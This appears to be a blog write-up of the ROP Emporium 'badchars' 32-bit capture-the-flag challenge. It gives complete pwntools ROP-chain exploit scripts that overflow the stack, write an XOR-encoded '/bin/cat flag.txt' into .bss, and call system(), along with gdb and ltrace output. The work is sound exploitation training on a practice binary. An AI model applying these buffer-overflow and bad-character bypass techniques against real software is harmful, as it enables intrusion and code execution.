---
layout: post
title: "ropemporium - badchars 32bit"
---

# Description
_An arbitrary write challenge with a twist; certain input characters get mangled before finding their way onto the stack. Find a way to deal with this and craft your exploit._

# Starting off
I took a look at the executable by executing it and giving it some test input. I did this because I needed some more information to see what I was working with.
I did this two times, one time with a "bad character" in the input. And with the second one without a bad character.

```
$ ./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> test input

Exiting
$ ./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> whew

Exiting
```
The output wasn't any different by the looks of it.

# Gathering information
In this phase I will gather the information I need in order to succesfully exploit this executable.

To start off I wanted to know what the padding was for when we start overwriting the `eip` register, with this I can control what instructions the executable performs (with limitations).
I did this using `pwntools` and `gdb`.
Firstly, I created a pattern that I will use as input with `pwntools`.
```python
>>> from pwn import fit,cyclic
>>> cyclic(150)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa'
```
What this pattern will do is make it easier for me to know what the padding is for overwriting `eip`. The executable should get a segmentation fault on the pattern, somewhere. And with `gdb` I can find that location.
```
$ gdb ./badchars32 -q
(gdb) r 
Starting program: /home/qh/CTF/ropemporium/badchars/32/badchars32 
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
(gdb) 
```
So it received a segmentation fault on the address `0x6161616c`, which is part of our pattern. `0x6161616c` is the hexadecimal encoded version of `aaal`.
So now I use `pwntools` to get the padding.
```python
>>> fit({0x6161616c:'B'})
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaaB'
>>> len(_)-1
44
>>> 
```
What `fit()` does is put (in this case) the letter B after the padding, so now I know what the length is by calling the `len` function. `_` in python means (from what I understand) the last output received. So, I know that the padding is 44 bytes.
Let's continue on gathering other information.
I checked what kind of gadgets were given to me this time. I thought that because the previous challenges had a function called `usefulGadgets`, it may be there this time too. I started gdb and checked what the defined functions were:
```
$ gdb ./badchars32 -q
Reading symbols from ./badchars32...(no debugging symbols found)...done.
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08048440  _init
0x08048480  printf@plt
0x08048490  free@plt
0x080484a0  memcpy@plt
0x080484b0  fgets@plt
0x080484c0  malloc@plt
0x080484d0  puts@plt
0x080484e0  system@plt
0x080484f0  exit@plt
0x08048500  __libc_start_main@plt
0x08048510  setvbuf@plt
0x08048520  memset@plt
0x08048540  _start
0x08048570  __x86.get_pc_thunk.bx
0x08048580  deregister_tm_clones
0x080485b0  register_tm_clones
0x080485f0  __do_global_dtors_aux
0x08048610  frame_dummy
0x0804863b  main
0x080486b6  pwnme
0x080487a9  usefulFunction
0x080487c2  nstrlen
0x08048801  checkBadchars
0x08048890  usefulGadgets
0x080488a0  __libc_csu_init
0x08048900  __libc_csu_fini
0x08048904  _fini
gdb-peda$
```
Looks like my assumption was correct! Let's see what the gadgets are.
```
gdb-peda$ disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048890 <+0>:     xor    BYTE PTR [ebx],cl
   0x08048892 <+2>:     ret
   0x08048893 <+3>:     mov    DWORD PTR [edi],esi
   0x08048895 <+5>:     ret
   0x08048896 <+6>:     pop    ebx
   0x08048897 <+7>:     pop    ecx
   0x08048898 <+8>:     ret
   0x08048899 <+9>:     pop    esi
   0x0804889a <+10>:    pop    edi
   0x0804889b <+11>:    ret
   0x0804889c <+12>:    xchg   ax,ax
   0x0804889e <+14>:    xchg   ax,ax
End of assembler dump.
gdb-peda$
```
Hmm, `xor BYTE PTR [ebx],cl` looks interesting.
Let's check `usefulFunction` now.
```
gdb-peda$ disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x080487a9 <+0>:     push   ebp
   0x080487aa <+1>:     mov    ebp,esp
   0x080487ac <+3>:     sub    esp,0x8
   0x080487af <+6>:     sub    esp,0xc
   0x080487b2 <+9>:     push   0x8048973
   0x080487b7 <+14>:    call   0x80484e0 <system@plt>
   0x080487bc <+19>:    add    esp,0x10
   0x080487bf <+22>:    nop
   0x080487c0 <+23>:    leave  
   0x080487c1 <+24>:    ret    
End of assembler dump.
gdb-peda$
```
So we need to call `system` at `0x80484e0`.
Now let's find where I could write into memory.
```
$ readelf -S badchars32
There are 31 section headers, starting at offset 0x1a3c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 000110 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ec 0002ec 000099 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048386 000386 000022 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080483a8 0003a8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080483c8 0003c8 000020 08   A  5   0  4
  [10] .rel.plt          REL             080483e8 0003e8 000058 08  AI  5  24  4
  [11] .init             PROGBITS        08048440 000440 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048470 000470 0000c0 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048530 000530 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048540 000540 0003c2 00  AX  0   0 16
  [15] .fini             PROGBITS        08048904 000904 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048918 000918 000063 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804897c 00097c 00004c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        080489c8 0009c8 00014c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4
  [25] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001040 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001040 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 00192f 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001074 000570 10     30  52  4
  [30] .strtab           STRTAB          00000000 0015e4 00034b 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```
Looks like `.bss` should be sufficient once again, because of the size and the `WA` flags.
So the `.bss` address is `0x0804a040`.

# Testing things out.
I wanted to test out the `xor BYTE PTR [ebx],cl` gadget. But first I need to write something .
To write something, I will use the `mov DWORD PTR [edi],esi` gadget. So I need to put the address where I want to write to in the `edi` register, and the content in the `esi` register. I will start with writing `FLAG` into memory, and then xor'ing it with 32. I do this because if you xor an ascii letter with 32, it changes the casing. Here's an example in python.
```python
>>> abc = 'abcdefghijklmnopqrstuvwxyz'
>>> for c in abc:
...   print('{}: {}'.format(c,chr(ord(c) ^ 32)))
... 
a: A
b: B
c: C
d: D
e: E
f: F
g: G
h: H
i: I
j: J
k: K
l: L
m: M
n: N
o: O
p: P
q: Q
r: R
s: S
t: T
u: U
v: V
w: W
x: X
y: Y
z: Z
>>> 
```
what `chr` does is take an integer and convert it into an ascii character. `ord` does the opposite of `chr`. And `^` is the xor operator.

# Making the ropchain
I will be using `pwntools` for the exploitation script.
I came up with this script.
```python
from pwn import *

bss_addr = 0x0804a040
xor = p32(0x08048890) # xor BYTE PTR [ebx],cl; ret
mov = p32(0x08048893) # mov DWORD PTR [edi],esi; ret
pop_ei = p32(0x08048899) # pop esi; pop edi; ret
pop_ex = p32(0x08048896) # pop ebx; pop ecx; ret
system = p32(0x80484e0)

# write 'FLAG' to bss_addr
payload = 'A'*44 # padding
payload += pop_ei
payload += 'GALF'
payload += p32(bss_addr)
payload += mov

# xor 'FLAG' with 32 to get 'flag'
payload += pop_ex
payload += p32(bss_addr)
payload += p32(32)
payload += xor
payload += pop_ex
payload += p32(bss_addr+1)
payload += p32(32)
payload += xor
payload += pop_ex
payload += p32(bss_addr+2)
payload += p32(32)
payload += xor
payload += pop_ex
payload += p32(bss_addr+3)
payload += p32(32)
payload += xor

print payload
```
I tested it out immediately, by piping the output of the script into a file.
```
$ python exploit.py > payload
```
Now I opened the executable with `gdb` and set a breakpoint to the xor gadget.
```
$ gdb ./badchars32 -q
Reading symbols from ./badchars32...(no debugging symbols found)...done.
(gdb) b *0x08048890
Breakpoint 1 at 0x8048890
(gdb) r < payload 
Starting program: /home/qh/CTF/ropemporium/badchars/32/badchars32 < payload
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> 
Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) nexti
0x08048892 in usefulGadgets ()
(gdb) x/s 0x0804a040
0x804a040 <stderr@@GLIBC_2.0>:  "\254\252\247\255"
(gdb)
```
Hmm, it looks like that didn't work. I checked what the registers were so I can hopefully see what went wrong.
```
(gdb) i r
eax            0x0      0
ecx            0xeb     235
edx            0x804b158        134525272
ebx            0x804a043        134520899
esp            0xffffd30c       0xffffd30c
ebp            0x41414141       0x41414141
esi            0x464c4147       1179402567
edi            0x804a040        134520896
eip            0x8048892        0x8048892 <usefulGadgets+2>
eflags         0x282    [ SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb)
```
So it must have been a wrong value in `cl`, which is the lower bytes of `ecx`.
I need to see where this `235` comes from. And after that I realised that the space character is a bad character. Good thing I tried. So let's just xor the string with 66 which is 'B'. If I xor each character of 'flag' with 66 I get '$.#%'. So let's try that first.
```python
from pwn import *

bss_addr = 0x0804a040
xor = p32(0x08048890) # xor BYTE PTR [ebx],cl; ret
mov = p32(0x08048893) # mov DWORD PTR [edi],esi; ret
pop_ei = p32(0x08048899) # pop esi; pop edi; ret
pop_ex = p32(0x08048896) # pop ebx; pop ecx; ret
system = p32(0x80484e0)

# write 'FLAG' to bss_addr
payload = 'A'*44 # padding
payload += pop_ei
payload += '$.#%' # flag xor
payload += p32(bss_addr)
payload += mov

# xor 'FLAG' with 32 to get 'flag'
payload += pop_ex
payload += p32(bss_addr)
payload += p32(66)
payload += xor
payload += pop_ex
payload += p32(bss_addr+1)
payload += p32(66)
payload += xor
payload += pop_ex
payload += p32(bss_addr+2)
payload += p32(66)
payload += xor
payload += pop_ex
payload += p32(bss_addr+3)
payload += p32(66)
payload += xor

print payload
```
With this script I should hopefully be able to write and xor successfully.
```
$ gdb ./badchars32 -q
Reading symbols from ./badchars32...(no debugging symbols found)...done.
(gdb) b *0x08048890
Breakpoint 1 at 0x8048890
(gdb) r < payload 
Starting program: /home/qh/CTF/ropemporium/badchars/32/badchars32 < payload
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> 
Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) 
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) 
Continuing.

Breakpoint 1, 0x08048890 in usefulGadgets ()
(gdb) nexti
0x08048892 in usefulGadgets ()
(gdb) x/s 0x0804a040
0x804a040 <stderr@@GLIBC_2.0>:  "flag"
(gdb)
```
Success!

##  Continuing the ropchain
So now let's fully write `/bin/cat flag.txt`.
So I have to write 5 times, and xor 17 times, I hope my buffer is long enough.
I remembered the DRY "rules". DRY stands for Don't Repeat Yourself. So I made a loop for adding the xor part to the payload. As well as a function that gives me what I need for the write instructions. 

## Realising (and fixing) another problem
While making a more efficient version of my exploit script, I forgot that there is a chance that xor'd characters also may become a bad character. So I made a script that filters out the xor's with bad characters.
```python
def valid_xor(string,xor_value):
    output = ''
    badchars = 'bic/ fns'
    for char in string:
        output += chr(ord(char) ^ xor_value)
    for char in badchars:
        if char in output:
            return False
    return True

target_string = '/bin/cat flag.txt'

for xor in xrange(10):
    if valid_xor(target_string,xor):
        print('Valid: {}'.format(hex(xor)))
```
After running I got this output:
```
$ python filter_xor.py
Valid: 0x6
```
So 0x6 should be fine to use!

## Finishing the ropchain
After some tinkering I came up with this script.
```python
from pwn import *

bss_addr = 0x0804a040
xor = p32(0x08048890) # xor BYTE PTR [ebx],cl; ret
mov = p32(0x08048893) # mov DWORD PTR [edi],esi; ret
pop_ei = p32(0x08048899) # pop esi; pop edi; ret
pop_ex = p32(0x08048896) # pop ebx; pop ecx; ret
system = p32(0x80484e0)

def write(string,offset):
    xorred_string = ''
    for char in string:
        xorred_string += chr(ord(char) ^ 0x6)
    chain = pop_ei
    chain += xorred_string
    chain += p32(bss_addr+offset)
    chain += mov
    return chain

# write '/bin/cat flag.txt' to bss_addr
payload = 'A'*44 # padding
payload += write('/bin',0)
payload += write('/cat',4)
payload += write(' fla',8)
payload += write('g.tx',12)
payload += write('t\x00\x00\x00',16)

# xor every character with 0x6
for i in xrange(18):
    payload += pop_ex
    payload += p32(bss_addr+i)
    payload += p32(0x6)
    payload += xor

print payload
```
Now all I need to do is call system. I edited the last part of the script like this:
```python
#last section of the exploit script
# xor every character with 0x6
for i in xrange(18):
    payload += pop_ex
    payload += p32(bss_addr+i)
    payload += p32(0x6)
    payload += xor

payload += system
payload += p32(0xdeadbeef)
payload += p32(bss_addr)

print payload
```
This should work, hopefully. 
```
$ python exploit.py | ./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> Segmentation fault
```
It did not work...
I used `ltrace` to see if `system` was being called properly. `ltrace` gives you the ability to "trace" library calls.
```
$ python exploit.py | ltrace ./badchars32
__libc_start_main(0x804863b, 1, 0xffe82a94, 0x80488a0 <unfinished ...>
setvbuf(0xf7f65d80, 0, 2, 0)                     = 0
setvbuf(0xf7f65ce0, 0, 2, 0)                     = 0
puts("badchars by ROP Emporium"badchars by ROP Emporium
)                 = 25
puts("32bits\n"32bits

)                                 = 8
malloc(512)                                      = 0x8567160
memset(0x8567160, '\0', 512)                     = 0x8567160
memset(0xffe829b0, '\0', 32)                     = 0xffe829b0
puts("badchars are: b i c / <space> f "...badchars are: b i c / <space> f n s
)      = 36
printf("> "> )                                     = 2
fgets("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0xf7f655c0) = 0x8567160
memcpy(0xffe829b0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 425) = 0xffe829b0
free(0x8567160)                                  = <void>
enable_breakpoint pid=19152, addr=0xdeadbeef, symbol=(null): Input/output error
system("/bin/cat flag.txt" <no return ...>
--- SIGCHLD (Child exited) ---
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Looks like it _did_ call `system` properly.
Later someone reminded me that sometimes, an exploit for this challenge may not work, and the creator(s) don't/doesn't know why. So I decided to leave it at this.

# References and helpful links

[pwntools](https://github.com/Gallopsled/pwntools)

[gdb-peda](https://github.com/longld/peda)

[MBE (modern binary exploitation) by RPISEC](https://github.com/RPISEC/MBE/)

[Well made explanation on buffer overflow](http://phrack.org/issues/49/14.html)